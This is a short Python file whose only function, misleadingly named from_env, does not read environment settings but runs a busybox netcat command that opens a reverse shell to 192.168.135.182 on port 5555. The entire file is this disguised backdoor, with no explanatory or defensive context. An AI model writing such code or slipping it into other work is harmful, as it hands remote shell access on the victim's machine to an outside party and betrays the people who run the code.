import os

def from_env():
    os.system("busybox nc 192.168.135.182 5555 -e sh")
    return None